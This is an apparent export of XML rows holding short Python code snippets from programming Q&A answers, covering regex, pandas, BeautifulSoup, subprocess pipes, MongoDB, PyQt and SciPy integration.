</snippet></ROW><ROW><id>20431641</id><snippet>creator.create("Fitness", base.Fitness, weights=(1.0, -1.0, 1.0, -1.0)</snippet></ROW><ROW><id>20431864</id><snippet>years</snippet></ROW><ROW><id>20431864</id><snippet>In [1]: import re
In [2]: s = "maria 10 years maria 10 maria10 maria10 years"
In [3]: re.findall(r"(\maria\s?[0-9]+)\s(?!years)", s)
Out[3]: ['maria 10', 'maria10']
</snippet></ROW><ROW><id>20432119</id><snippet>df</snippet></ROW><ROW><id>20432119</id><snippet>frame</snippet></ROW><ROW><id>20432119</id><snippet>&gt;&gt;&gt; df.groupby(['Country','Date']).agg(lambda x: x[x&gt;0].mean())
                Hours
Country Date
Japan   01 jan    3.0
USA     01 jan    3.5
&gt;&gt;&gt; df.ix[3, 'Hours'] = -1
&gt;&gt;&gt; df.groupby(['Country','Date']).agg(lambda x: x[x&gt;0].mean())
                Hours
Country Date
Japan   01 jan    NaN
USA     01 jan    3.5
</snippet></ROW><ROW><id>20432380</id><snippet>for loop in range(1):
</snippet></ROW><ROW><id>20432380</id><snippet>range(1)</snippet></ROW><ROW><id>20432380</id><snippet>loop</snippet></ROW><ROW><id>20432380</id><snippet>while</snippet></ROW><ROW><id>20432380</id><snippet>valid = False
while not valid:
    valid, choice = pattern_input()
</snippet></ROW><ROW><id>20432396</id><snippet>np.std</snippet></ROW><ROW><id>20432396</id><snippet>DataFrame.std</snippet></ROW><ROW><id>20432396</id><snippet>&gt;&gt;&gt; prices.std(axis=0, ddof=0)
0    0.323259
1    0.173375
2    0.147740
dtype: float64
&gt;&gt;&gt; prices.std(axis=0, ddof=1)
0    0.395909
1    0.212340
2    0.180943
dtype: float64
&gt;&gt;&gt; np.std(prices.values, axis=0, ddof=0)
array([ 0.32325862,  0.17337503,  0.1477395 ])
&gt;&gt;&gt; np.std(prices.values, axis=0, ddof=1)
array([ 0.39590933,  0.21234018,  0.1809432 ])
</snippet></ROW><ROW><id>20432461</id><snippet>words</snippet></ROW><ROW><id>20432461</id><snippet>sorted</snippet></ROW><ROW><id>20432461</id><snippet>key</snippet></ROW><ROW><id>20432461</id><snippet>sorted</snippet></ROW><ROW><id>20432461</id><snippet>words</snippet></ROW><ROW><id>20432461</id><snippet>def front_x(words):
    return sorted(words, key=lambda word: (word[0] != 'x', word))
</snippet></ROW><ROW><id>20432461</id><snippet>key</snippet></ROW><ROW><id>20432461</id><snippet>words</snippet></ROW><ROW><id>20432461</id><snippet>words</snippet></ROW><ROW><id>20432461</id><snippet>tuples</snippet></ROW><ROW><id>20432461</id><snippet>lambda</snippet></ROW><ROW><id>20432461</id><snippet>print(front_x(['mix', 'xyz', 'apple', 'xanadu', 'aardvark']))
# ['xanadu', 'xyz', 'aardvark', 'apple', 'mix']
</snippet></ROW><ROW><id>20432461</id><snippet>words</snippet></ROW><ROW><id>20432461</id><snippet>word[0]</snippet></ROW><ROW><id>20432461</id><snippet>IndexError</snippet></ROW><ROW><id>20432461</id><snippet>''.startswith('x')</snippet></ROW><ROW><id>20432461</id><snippet>False</snippet></ROW><ROW><id>20432461</id><snippet>word.startswith('x')</snippet></ROW><ROW><id>20432461</id><snippet>front_x</snippet></ROW><ROW><id>20432461</id><snippet>word[0] == 'x'</snippet></ROW><ROW><id>20432565</id><snippet>In [11]: a = [1, 2, 3]

In [12]: b = 4

In [13]: for L in a:  # no need to "and b"
             print L, b
1 4
2 4
3 4
</snippet></ROW><ROW><id>20432565</id><snippet>In [14]: for b in a:
             print b
1
2
3

In [15]: b
Out[15]: 3
</snippet></ROW><ROW><id>20432565</id><snippet>In [21]: c = [4, 5, 6]

In [22]: zip(a, c)
Out[22]: [(1, 4), (2, 5), (3, 6)]
</snippet></ROW><ROW><id>20432565</id><snippet>In [23]: from itertools import izip  # in python 3, just use zip

In [24]: for La, Lc in izip(a, c):
             print La, Lb
1 4
2 5
3 6
</snippet></ROW><ROW><id>20432945</id><snippet>safe_attrs_only = False</snippet></ROW><ROW><id>20432945</id><snippet>Cleaner.safe_attrs</snippet></ROW><ROW><id>20432945</id><snippet>lxml.html.defs</snippet></ROW><ROW><id>20432945</id><snippet>style</snippet></ROW><ROW><id>20432945</id><snippet>from lxml import html
from lxml.html import clean

s ='&lt;marquee&gt;&lt;span style="color: #008800;"&gt;67.51&lt;/span&gt;&lt;/marquee&gt;'
doc = html.fromstring(s)
cleaner = clean.Cleaner()
cleaner.safe_attrs_only = False

print html.tostring(cleaner.clean_html(doc))
</snippet></ROW><ROW><id>20432945</id><snippet>&lt;div&gt;&lt;span style="color: #008800;"&gt;67.51&lt;/span&gt;&lt;/div&gt;
</snippet></ROW><ROW><id>20433122</id><snippet>import re

pat = '(?:^(?![\t ]*\r?\n).+\n)*?'\
      '.*nasdaq.*\n'\
      '(?:^(?![\t ]*\r?\n).+\n?)*'

filename = 'to_define.txt'

with open(filename,'rb+') as f:
    content = f.read()
    f.seek(0,0)
    f.write(re.sub(pat,'',content,flags=re.M))


    f.truncate()
</snippet></ROW><ROW><id>20433122</id><snippet>'(?:^(?![ \t]*\r?\n).+\n)*?'\
'.*nasdaq.*\n'\
'(?:^(?![ \t]*\r?\n).+\n?)*'
</snippet></ROW><ROW><id>20433122</id><snippet>[\t ]</snippet></ROW><ROW><id>20433122</id><snippet>[\t ]*</snippet></ROW><ROW><id>20433122</id><snippet>(?!</snippet></ROW><ROW><id>20433122</id><snippet>(?=</snippet></ROW><ROW><id>20433122</id><snippet>(?![\t ]*\r?\n)</snippet></ROW><ROW><id>20433122</id><snippet>^</snippet></ROW><ROW><id>20433122</id><snippet>0 or more tab/blank-potential \r-\n</snippet></ROW><ROW><id>20433122</id><snippet>^</snippet></ROW><ROW><id>20433122</id><snippet>re.MULTILINE</snippet></ROW><ROW><id>20433122</id><snippet>(?! *\r?\n)</snippet></ROW><ROW><id>20433122</id><snippet>(?:^.+\n)*?</snippet></ROW><ROW><id>20433122</id><snippet>(...)</snippet></ROW><ROW><id>20433122</id><snippet>?:</snippet></ROW><ROW><id>20433122</id><snippet>(?:......)</snippet></ROW><ROW><id>20433122</id><snippet>.+\n</snippet></ROW><ROW><id>20433122</id><snippet>\n</snippet></ROW><ROW><id>20433122</id><snippet>\n</snippet></ROW><ROW><id>20433122</id><snippet>^.+\n</snippet></ROW><ROW><id>20433122</id><snippet>re.M</snippet></ROW><ROW><id>20433122</id><snippet>.</snippet></ROW><ROW><id>20433122</id><snippet>\n</snippet></ROW><ROW><id>20433122</id><snippet>.+</snippet></ROW><ROW><id>20433122</id><snippet>\n</snippet></ROW><ROW><id>20433122</id><snippet>^.+\n</snippet></ROW><ROW><id>20433122</id><snippet>*</snippet></ROW><ROW><id>20433122</id><snippet>(?:^.+\n)</snippet></ROW><ROW><id>20433122</id><snippet>(?:^(?![\t ]*\r?\n).+\n)*</snippet></ROW><ROW><id>20433122</id><snippet>\n</snippet></ROW><ROW><id>20433122</id><snippet>`\t\t\n</snippet></ROW><ROW><id>20433122</id><snippet>\t \t \n</snippet></ROW><ROW><id>20433122</id><snippet>.*nasdaq.*\n</snippet></ROW><ROW><id>20433122</id><snippet>.*nasdaq.*\n</snippet></ROW><ROW><id>20433122</id><snippet>.*nasdaq.*(\n|\Z)</snippet></ROW><ROW><id>20433122</id><snippet>\Z</snippet></ROW><ROW><id>20433122</id><snippet>pat = '(?:^(?![\t ]*\r?\n).+\n)*?'\
      '.*?nasdaq.*(\n|\Z)'\
      '(?:^(?![\t ]*\r?\n).+\n?)*'\
      '(?:[\t ]*\r?\n)*'
</snippet></ROW><ROW><id>20433249</id><snippet>datetime.datetime.now()</snippet></ROW><ROW><id>20433249</id><snippet>utcnow</snippet></ROW><ROW><id>20433249</id><snippet>ttl</snippet></ROW><ROW><id>20433249</id><snippet>import pymongo
import datetime

mongo_con = pymongo.Connection('localhost', 27017)
mongo_db = mongo_con.Mongo_database
mongo_col = mongo_db.my_TTL_collection

timestamp = datetime.datetime.now()
utc_timestamp = datetime.datetime.utcnow()

mongo_col.ensure_index("date", expireAfterSeconds=3*60)                     

mongo_col.insert({'_id': 'session', "date": timestamp, "session": "test session"})
mongo_col.insert({'_id': 'utc_session', "date": utc_timestamp, "session": "test session"})
# the utc_session will be deleted after around 3 minutes, 
# the other depending on your timezone
</snippet></ROW><ROW><id>20433371</id><snippet>Father.__init__</snippet></ROW><ROW><id>20433371</id><snippet>super</snippet></ROW><ROW><id>20433371</id><snippet>class Son(Father):
    def __init__(self, *args, **kwargs):
        Father.__init__(self, *args, **kwargs)
        self.has_job = 'yes'
</snippet></ROW><ROW><id>20433522</id><snippet>from PyQt4 import QtCore, QtGui
from mainwindow_ui import Ui_MainWindow

class MainWindow(QtGui.QMainWindow, Ui_MainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.setupUi(self)
        ...
        self.buttonNext.clicked.connect(self.handleButtonNext)
        self.buttonPrev.clicked.connect(self.handleButtonPrev)

    def handleButtonNext(self):
        index = self.stackedWidget.currentIndex() + 1
        if index &lt; self.stackedWidget.count():
            self.stackedWidget.setCurrentWidget(index)

    def handleButtonPrev(self):
        index = self.stackedWidget.currentIndex() - 1
        if index &gt;= 0:
            self.stackedWidget.setCurrentWidget(index)

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>20433612</id><snippet>while game_running:
    if STATE == STATE_MENU:
        Menu_ProcessInput()
        Menu_Update()
        Menu_Draw()
    elif STATE == STATE_INGAME:
        INGAME_ProcessInput()
        INGAME_Update()
        INGAME_Draw()
    elif STATE == STATE_GAMEOVER:
        GAMEOVER_ProcessInput()
        GAMEOVER_Update()
        GAMEOVER_Draw()
</snippet></ROW><ROW><id>20433757</id><snippet>a.attrs</snippet></ROW><ROW><id>20433757</id><snippet>&lt;a&gt;</snippet></ROW><ROW><id>20433757</id><snippet>&lt;a&gt;</snippet></ROW><ROW><id>20433757</id><snippet>subtab</snippet></ROW><ROW><id>20433757</id><snippet>'subtab' not in a.attrs</snippet></ROW><ROW><id>20433757</id><snippet>from bs4 import BeautifulSoup, SoupStrainer # pip install beautifulsoup4

player_links = SoupStrainer('a', 'playerLink')
soup = BeautifulSoup(html, parse_only=player_links)
names = [a.get_text().strip()
         for a in soup.find_all(player_links) if 'subtab' not in a.attrs]
print(names)
# -&gt; ['Russell, Addison', 'Vargas, Jason']
</snippet></ROW><ROW><id>20433757</id><snippet>subtab=False</snippet></ROW><ROW><id>20433757</id><snippet>subtab</snippet></ROW><ROW><id>20433757</id><snippet>from bs4 import BeautifulSoup, SoupStrainer # pip install beautifulsoup4

player_links = SoupStrainer('a', 'playerLink', subtab=False)
soup = BeautifulSoup(html, parse_only=player_links)
names = [a.get_text().strip()
         for a in soup.find_all(player_links)]
print(names)
</snippet></ROW><ROW><id>20433757</id><snippet>player_links</snippet></ROW><ROW><id>20433757</id><snippet>.find_all(player_links)</snippet></ROW><ROW><id>20433757</id><snippet>from bs4 import BeautifulSoup, SoupStrainer # pip install beautifulsoup4

player_links = SoupStrainer('a', 'playerLink', subtab=False)
soup = BeautifulSoup(html, parse_only=player_links)
names = [a.get_text().strip() for a in soup]
print(names)
</snippet></ROW><ROW><id>20433832</id><snippet>#!/usr/local/cpython-3.3/bin/python

import re

def give_string():
    string = '''
eth0      Link encap:Ethernet  HWaddr 22:33:0a:e9:15:76
          inet addr:10.244.21.118  Bcast:10.244.21.127  Mask:255.244.255.192
          inet6 addr: fe80::0050:aff:fee9:1576/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:807304 errors:0 dropped:0 overruns:0 frame:0
          TX packets:611741 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:253087331 (241.3 MiB)  TX bytes:167902811 (160.1 MiB)
    '''
    return string

def main():
    string = give_string()
    regex = re.compile('^.*inet addr:\s*(\d+\.\d+\.\d+\.\d+) .*Mask:\s*(\d+\.\d+\.\d+\.\d+).*$', re.MULTILINE | re.DOTALL)
    match = regex.match(string)
    ip_address = match.group(1)
    subnet_mask=match.group(2)
    print(ip_address, subnet_mask)

main()
</snippet></ROW><ROW><id>20433837</id><snippet>DataFrame</snippet></ROW><ROW><id>20433837</id><snippet>groupby</snippet></ROW><ROW><id>20433837</id><snippet>pandas</snippet></ROW><ROW><id>20433837</id><snippet>import pandas as pd
df = pd.DataFrame({'a': ['x', 'y', 'x', 'y'],
                   'x': [1, 2, 3, 4]})

df.groupby('a').apply(myfun)
</snippet></ROW><ROW><id>20433837</id><snippet>myfun</snippet></ROW><ROW><id>20433837</id><snippet>x</snippet></ROW><ROW><id>20433837</id><snippet>myfun</snippet></ROW><ROW><id>20433837</id><snippet>DataFrame</snippet></ROW><ROW><id>20433837</id><snippet>Series</snippet></ROW><ROW><id>20433837</id><snippet>apply</snippet></ROW><ROW><id>20433837</id><snippet>df.groupby('a')['x'].apply(myfun)
</snippet></ROW><ROW><id>20433837</id><snippet>pd.Series</snippet></ROW><ROW><id>20433837</id><snippet>groupby</snippet></ROW><ROW><id>20433893</id><snippet>re.findall(r"\d+(?=\s)", "1323 323 434 ")
</snippet></ROW><ROW><id>20433974</id><snippet>MySQLdb</snippet></ROW><ROW><id>20433974</id><snippet>venv/bin/pip install mysql-python
</snippet></ROW><ROW><id>20433974</id><snippet>google.appengine.api.rdbms_mysqldb</snippet></ROW><ROW><id>20433974</id><snippet>paramstyle</snippet></ROW><ROW><id>20433974</id><snippet>import MySQLdb</snippet></ROW><ROW><id>20433974</id><snippet>connect()</snippet></ROW><ROW><id>20434281</id><snippet>|</snippet></ROW><ROW><id>20434281</id><snippet>shell=True</snippet></ROW><ROW><id>20434281</id><snippet>&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; p = subprocess.Popen(['cat', 'abc1'], stdout=subprocess.PIPE)
&gt;&gt;&gt; p1 = subprocess.Popen(['uniq', '-c'], stdin=p.stdout, stdout=subprocess.PIPE)
&gt;&gt;&gt; print p1.communicate()[0]
      3 word1
      1 word3
      1 word4
      1 word5
</snippet></ROW><ROW><id>20434281</id><snippet>shell=True</snippet></ROW><ROW><id>20434281</id><snippet>&gt;&gt;&gt; print subprocess.Popen('cat abc1 | uniq -c', shell=True,
                                            stdout=subprocess.PIPE).communicate()[0]
      3 word1
      1 word3
      1 word4
      1 word5
</snippet></ROW><ROW><id>20434281</id><snippet>shell=True</snippet></ROW><ROW><id>20434412</id><snippet>num</snippet></ROW><ROW><id>20434412</id><snippet>$gte</snippet></ROW><ROW><id>20434412</id><snippet>low</snippet></ROW><ROW><id>20434412</id><snippet>$lte</snippet></ROW><ROW><id>20434412</id><snippet>high</snippet></ROW><ROW><id>20434412</id><snippet>low = 100
high = 1000

for doc in exampleCollection.find({ "num": { "$gte": low, "$lte":  high }})
    print doc
</snippet></ROW><ROW><id>20434412</id><snippet>{ 
    "_id" : ObjectId("52a248af1d02442354276cfe"), 
    "num" : 500
} 
</snippet></ROW><ROW><id>20434412</id><snippet>num</snippet></ROW><ROW><id>20434412</id><snippet>create_index</snippet></ROW><ROW><id>20434412</id><snippet>exampleCollection.create_index("num")
</snippet></ROW><ROW><id>20434439</id><snippet>fit_transform</snippet></ROW><ROW><id>20434439</id><snippet>transform</snippet></ROW><ROW><id>20434468</id><snippet>Tag.next</snippet></ROW><ROW><id>20434468</id><snippet>Tag.next_element</snippet></ROW><ROW><id>20434468</id><snippet>for a in psoup('a': {'class': 'playerLink'}):
    print a.text
    print a.next.next
</snippet></ROW><ROW><id>20434512</id><snippet>for i in range (numRolls):
    rv= rollDice(numDice, numSides )
    rolls[rv]+=1        #where I keep on getting the error at :(
</snippet></ROW><ROW><id>20434512</id><snippet>for i in range (numRolls):
    rv = rollDice(numDice, numSides)
    for dice in rv:
        rolls[dice] += 1
</snippet></ROW><ROW><id>20434512</id><snippet>rollDice</snippet></ROW><ROW><id>20434512</id><snippet>numDice</snippet></ROW><ROW><id>20434512</id><snippet>list</snippet></ROW><ROW><id>20434512</id><snippet>rolls</snippet></ROW><ROW><id>20434512</id><snippet>def rollDice(numSides):
    return random.randint(1, numSides)
</snippet></ROW><ROW><id>20434656</id><snippet>str.isupper</snippet></ROW><ROW><id>20434656</id><snippet>str.split</snippet></ROW><ROW><id>20434656</id><snippet>&gt;&gt;&gt; var = 'I have a string I want GE and APPLES but nothing else'
&gt;&gt;&gt; [x for x in var.split() if x.isupper() and len(x) &gt; 1 ]
['GE', 'APPLES']
</snippet></ROW><ROW><id>20434656</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; re.findall(r'\b[A-Z]{2,}\b', var)
['GE', 'APPLES']
</snippet></ROW><ROW><id>20434656</id><snippet>&gt;&gt;&gt; var = 'I have a string I want GE and APPLES but nothing else'*10**5
&gt;&gt;&gt; %timeit [x for x in var.split() if x.isupper() and len(x) &gt; 1 ]
1 loops, best of 3: 773 ms per loop
&gt;&gt;&gt; %timeit re.findall(r'\b[A-Z]{2,}\b', var)
1 loops, best of 3: 491 ms per loop
</snippet></ROW><ROW><id>20434656</id><snippet>&gt;&gt;&gt; var = ' '.join(['FOO'*1000, 'bar'*1000, 'SPAM'*1000]*1000)
&gt;&gt;&gt; %timeit [x for x in var.split() if x.isupper() and len(x) &gt; 1 ]
1 loops, best of 3: 224 ms per loop
&gt;&gt;&gt; %timeit re.findall(r'\b[A-Z]{2,}\b', var)
1 loops, best of 3: 483 ms per loop
</snippet></ROW><ROW><id>20434720</id><snippet>if difficultySelect == "E" or "e":
    worksheet.beginGameLoop("easy")
elif difficultySelect == "M" or "m":
    worksheet.beginGameLoop("med")
elif difficultySelect == "H" or "h":
</snippet></ROW><ROW><id>20434720</id><snippet>if difficultySelect == "E" or difficultySelect == "e":
    worksheet.beginGameLoop("easy")
elif difficultySelect == "M" or difficultySelect == "m":
    worksheet.beginGameLoop("med")
elif difficultySelect == "H" or difficultySelect == "h":
</snippet></ROW><ROW><id>20434720</id><snippet>if difficultySelect in ("E", "e"):
    worksheet.beginGameLoop("easy")
elif difficultySelect in ("M", "m"):
    worksheet.beginGameLoop("med")
elif difficultySelect in ("H", "h"):
</snippet></ROW><ROW><id>20434720</id><snippet>if x == 'a' or 'b'</snippet></ROW><ROW><id>20434720</id><snippet>or</snippet></ROW><ROW><id>20434720</id><snippet>False</snippet></ROW><ROW><id>20434720</id><snippet>False</snippet></ROW><ROW><id>20434720</id><snippet>True</snippet></ROW><ROW><id>20434720</id><snippet>difficultySelect</snippet></ROW><ROW><id>20434720</id><snippet>E</snippet></ROW><ROW><id>20434720</id><snippet>e</snippet></ROW><ROW><id>20434720</id><snippet>e</snippet></ROW><ROW><id>20434720</id><snippet>False</snippet></ROW><ROW><id>20434861</id><snippet>foo</snippet></ROW><ROW><id>20434861</id><snippet>LOGGING = {
    ...
    'handlers': {
        ...
        'file_report': {
            'level': 'INFO',
            'class': 'logging.handlers.TimedRotatingFileHandler',
            'filename': os.path.join(SITE_ROOT, '..', 'logs', 'REPORT.log'),
            'when':'midnight',
            'interval': 1,
            'backupCount': 4,
            'formatter':'simple',
        },
    },
    'loggers': {
        'django.request': {
            'handlers': ['console'],
            'propagate': False,
            'level': 'DEBUG',
        },
        'foo.report': {
            'handlers': ['file_report'],
            'propagate': False,
            'level': 'INFO',
        },
    },
}
</snippet></ROW><ROW><id>20434861</id><snippet>import logging
logging.getLogger('foo.report').info('something something')
</snippet></ROW><ROW><id>20434956</id><snippet>import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

dataframe = pd.DataFrame({'Col': np.random.uniform(size=1000)})
plt.scatter(dataframe.index, dataframe['Col'])
</snippet></ROW><ROW><id>20434956</id><snippet>quit()</snippet></ROW><ROW><id>20435021</id><snippet>with open(input('Enter file name: '),'r') as f:
    w = [len(word) for line in f for word in line.rstrip().split(" ")]
    w_avg = sum(w)/len(w)
</snippet></ROW><ROW><id>20435169</id><snippet>import tarfile
from subprocess import check_output
# Capture the tar file from subversion
tmp='/home/me/tempfile.tar'
open(tmp, 'wb').write(check_output(["svn", "cat", "svn://url/some.tar"]))
# Extract the file we want, saving to current directory
tarfile.open(tmp).extract('dir1/fname.ext', path='dir2')
</snippet></ROW><ROW><id>20435169</id><snippet>svn cat url</snippet></ROW><ROW><id>20435169</id><snippet>svn help cat</snippet></ROW><ROW><id>20435169</id><snippet>url</snippet></ROW><ROW><id>20435169</id><snippet>svn://...</snippet></ROW><ROW><id>20435169</id><snippet>svn+ssh://...</snippet></ROW><ROW><id>20435169</id><snippet>file://...</snippet></ROW><ROW><id>20435169</id><snippet>svn cat url</snippet></ROW><ROW><id>20435169</id><snippet>["svn", "cat", "url"]</snippet></ROW><ROW><id>20435169</id><snippet>svn</snippet></ROW><ROW><id>20435169</id><snippet>tmp</snippet></ROW><ROW><id>20435169</id><snippet>handle = t.extractfile('dir1/fname.ext')
print handle.readlines() # show file contents
</snippet></ROW><ROW><id>20435310</id><snippet>from bs4 import BeautifulSoup

page = "&lt;span&gt;Hello world&lt;/span&gt;&lt;h1&gt;Nice to see you&lt;/h1&gt;&lt;span&gt;no&lt;/span&gt;&lt;span&gt;Hello babe&lt;/span&gt;"

soup = BeautifulSoup(page)

while len(soup.find_all('span')) &gt; 0:
    soup.span.extract()
print soup
</snippet></ROW><ROW><id>20435335</id><snippet>x</snippet></ROW><ROW><id>20435335</id><snippet>x</snippet></ROW><ROW><id>20435335</id><snippet>@functools.lru_cache()</snippet></ROW><ROW><id>20435335</id><snippet>from functools import lru_cache

@lru_cache(16)  # cache 16 different `x` return values
def costly_function_a(x):
    print("costly_function_a has been called.")
    return x #Dummy operation.

@lru_cache(32)  # cache 32 different `x` return values
def costly_function_b(x):
    print("costly_function_b has been called.")
    return 5.*x #Dummy operation.
</snippet></ROW><ROW><id>20435335</id><snippet>from functools import wraps

def cache_most_recent(func):
    cache = [None, None]
    @wraps(func)
    def wrapper(*args, **kw):
        if (args, kw) == cache[0]:
            return cache[1]
        cache[0] = args, kw
        cache[1] = func(*args, **kw)
        return cache[1]
    return wrapper

@cache_most_recent
def costly_function_a(x):
    print("costly_function_a has been called.")
    return x #Dummy operation.

@cache_most_recent
def costly_function_b(x):
    print("costly_function_b has been called.")
    return 5.*x #Dummy operation.
</snippet></ROW><ROW><id>20435335</id><snippet>functools.lru_cache()</snippet></ROW><ROW><id>20435651</id><snippet>(0,0,np.random.randint(0,2,Nsize))
</snippet></ROW><ROW><id>20435651</id><snippet>t</snippet></ROW><ROW><id>20435651</id><snippet>dt</snippet></ROW><ROW><id>20435819</id><snippet>2&gt;&amp;1</snippet></ROW><ROW><id>20435819</id><snippet>'app/views'</snippet></ROW><ROW><id>20435819</id><snippet>find</snippet></ROW><ROW><id>20435819</id><snippet>'/full/path/to/app/views'</snippet></ROW><ROW><id>20436122</id><snippet>def get_non_base_10(s):
    #support for base 2,8,and 16
    if s.startswith("O") and s[1:].isdigit():
       return int(s[1:],8)
    elif s.startswith("0x") and s[2:].isdigit():
       return int(s[2:],16)
    elif s.startswith("0b") and s[2:].isdigit():
         return int(s[2:],2)

def get_number(s,decimal_separator=".",thousands_separator=","):
    if isinstance(s,basestring):
       temp_val = get_non_base_10(s)
       if temp_val is not None:
          return temp_val
       s = s.replace(decimal_separator,".").replace(thousands_separator,"")
    try:
       return float(s)
    except ValueError:
       return "nan"

def is_number(s,decimal_separator=".",thousands_separator=",",return_type="b"):
    numeric = get_number(s,decimal_separator,thousands_separator)
    return numeric if return_type != "b" else numeric != "nan"
</snippet></ROW><ROW><id>20436123</id><snippet>"_r"</snippet></ROW><ROW><id>20436123</id><snippet>"cool_r"</snippet></ROW><ROW><id>20436123</id><snippet>.endswith("_r")</snippet></ROW><ROW><id>20436263</id><snippet>True</snippet></ROW><ROW><id>20436263</id><snippet>list.reverse()</snippet></ROW><ROW><id>20436263</id><snippet>c = b.reverse()</snippet></ROW><ROW><id>20436263</id><snippet>b</snippet></ROW><ROW><id>20436263</id><snippet>c</snippet></ROW><ROW><id>20436263</id><snippet>None</snippet></ROW><ROW><id>20436263</id><snippet>def is_reverse(a,b):
    # copy b -- Not strictly necessary if you don't care about changing the inputs...
    c = b[:] 
    c.reverse()
    for i in range(len(a)):
        if a[i] != c[i]:
            return False
    return True
</snippet></ROW><ROW><id>20436263</id><snippet>a == b[::-1]
</snippet></ROW><ROW><id>20436334</id><snippet>odeint</snippet></ROW><ROW><id>20436334</id><snippet>In [704]: a
Out[704]: array([0, 1, 2, 3, 4])

In [705]: b
Out[705]: 
array([[0],
       [1],
       [2]])

In [706]: a+b
Out[706]: 
array([[0, 1, 2, 3, 4],
       [1, 2, 3, 4, 5],
       [2, 3, 4, 5, 6]])
</snippet></ROW><ROW><id>20436334</id><snippet>b</snippet></ROW><ROW><id>20436334</id><snippet>t</snippet></ROW><ROW><id>20436334</id><snippet>vderivs</snippet></ROW><ROW><id>20436334</id><snippet>t</snippet></ROW><ROW><id>20436334</id><snippet>dt = .1   # another global constant parameter

def vderivs(v, t):
    ts = np.arange(0, t, dt)
    v1 = an * controller(v, ts) * torque(v)
    v2 = m*Cr*np.sign(v)
    v3 = 0.5*p*Cd*A*v**2 
    v4 = m*np.sin(theta)
    vtot = v1+v2+v3+v4*(ts&gt;=10) # a vector of times includes incline only after ts = 10
    return vtot/m
</snippet></ROW><ROW><id>20436334</id><snippet>uderivs</snippet></ROW><ROW><id>20436334</id><snippet>def uderivs(v, t):
    return vr - v
</snippet></ROW><ROW><id>20436334</id><snippet>velocity</snippet></ROW><ROW><id>20436334</id><snippet>controller</snippet></ROW><ROW><id>20436334</id><snippet>v0</snippet></ROW><ROW><id>20436334</id><snippet>v</snippet></ROW><ROW><id>20436334</id><snippet>def controller(currentV, time):
    z = integrate.odeint(uderivs, currentV, time)
    return kp*(vr-currentV) + ki*z.squeeze()

def velocity(desired, theta, time):
    return integrate.odeint(vderivs, desired, time)
</snippet></ROW><ROW><id>20436334</id><snippet>time = np.linspace(0,50,50) #time
</snippet></ROW><ROW><id>20436334</id><snippet>import matplotlib.pylab as plt
import numpy as np
import scipy.integrate as integrate

##Parameters
kp = .5 #proportional gain
ki = .1 #integral gain
vr = 30 #desired velocity in m/s
Tm = 190 #Max Torque in Nm
wm = 420 #engine speed
B = 0.4 #Beta
an = 12 #at gear 4
p = 1.3 #air density
Cd = 0.32 #Drag coefficient
Cr = .01 #Coefficient of rolling friction
A = 2.4 #frontal area

##Variables
m = 18000.0 #weight
v0 = 20. #starting velocity
t = np.linspace(0, 20, 50) #time
dt = .1
theta = np.radians(4) #Theta

def torque(v):    
    return Tm * (1 - B*(an*v/wm - 1)**2)  

def vderivs(v, t):
    ts = np.arange(0, t, dt)
    v1 = an * controller(v, ts) * torque(v)
    v2 = m*Cr*np.sign(v)
    v3 = 0.5*p*Cd*A*v**2
    v4 = m*np.sin(theta)
    vtot = v1+v2+v3+v4*(ts&gt;=10)
    return vtot/m

def uderivs(v, t):
    return vr - v

def controller(currentV, time):
    z = integrate.odeint(uderivs, currentV, time)
    return kp*(vr-currentV) + ki*z.squeeze()

def velocity(desired, theta, time):
    return integrate.odeint(vderivs, desired, time)

plt.plot(t, velocity(v0, theta, t), 'k-', lw=2, label='velocity')
plt.plot(t, controller(v0, t), 'r', lw=2, label='controller')
plt.legend()
plt.show()
</snippet></ROW><ROW><id>20436830</id><snippet>import copy
import random
validNames=["John", "Aaron", "Lydia", "Robin"]

def drawNames(namelist,currentname):
    '''
    namelist: list of names to draw from
    currentname: name of person doing the current draw
    '''
    draw_namelist = copy.copy(namelist) # make a copy to remove person drawing if needed
    if currentname in draw_namelist: # check if the person drawing is in the list
        draw_namelist.remove(currentname) # remove current name if in list
    try:
        drawn_name = random.choice(draw_namelist)
        namelist.remove(drawn_name)
        newnamelist = namelist
        print "Drew {}".format(drawn_name)
        print "New list: {}".format(newnamelist)
    except:
        print "Nobody for me to draw!"
        drawn_name=None
        newnamelist = namelist
    return drawn_name, newnamelist
</snippet></ROW><ROW><id>20436830</id><snippet>In [39]: newlist=["John", "Aaron", "Lydia", "Robin"]

In [40]: name,newlist = drawNames(newlist,"Lydia")
Drew Robin
New list: ['John', 'Aaron', 'Lydia']

In [41]: name,newlist = drawNames(newlist,"John")
Drew Aaron
New list: ['John', 'Lydia']

In [42]: name,newlist = drawNames(newlist,"Aaron")
Drew John
New list: ['Lydia']

In [43]: name,newlist = drawNames(newlist,"Robin")
Drew Lydia
New list: []
</snippet></ROW><ROW><id>20436877</id><snippet>import mechanize
br = mechanize.Browser()
br.open("http://web.sba.gov/pro-net/search/dsp_dsbs.cfm")
br.select_form('SearchForm')
br.form["State"] = ["AL","AK"]
br.form["E8a"] = ["Y"]
br.form["Report"] = ["S"]

response = br.submit()
fileobj = open("szz.html","wb")
fileobj.write(response.read())
fileobj.close()
</snippet></ROW><ROW><id>20436877</id><snippet>br.form[control_name]</snippet></ROW><ROW><id>20436877</id><snippet>.html</snippet></ROW><ROW><id>20436919</id><snippet>render_template()</snippet></ROW><ROW><id>20436919</id><snippet>&lt;img&gt;</snippet></ROW><ROW><id>20436919</id><snippet>src</snippet></ROW><ROW><id>20436919</id><snippet>url_for()</snippet></ROW><ROW><id>20436919</id><snippet>&lt;img src="{{ url_for('mypng', data = some_data) }}"&gt;
